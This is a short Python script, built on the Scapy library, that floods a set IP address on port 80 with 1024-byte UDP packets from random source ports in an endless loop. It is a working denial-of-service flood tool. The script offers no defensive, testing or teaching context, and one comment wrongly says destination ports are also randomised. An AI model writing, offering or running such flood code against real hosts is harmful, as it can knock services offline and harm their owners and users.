from scapy.all import *
import random

# Define the target IP and port
target_ip = "192.168.0.1"
target_port = 80

# Define a function to send UDP packets
def send_packet():
    # Generate a random source port number
    src_port = random.randint(1024, 65535)

    # Create a UDP packet with random source and destination port numbers
    packet = IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load="X"*1024)

    # Send the packet
    send(packet, verbose=0)

# Send the UDP packets in a loop
while True:
    send_packet()
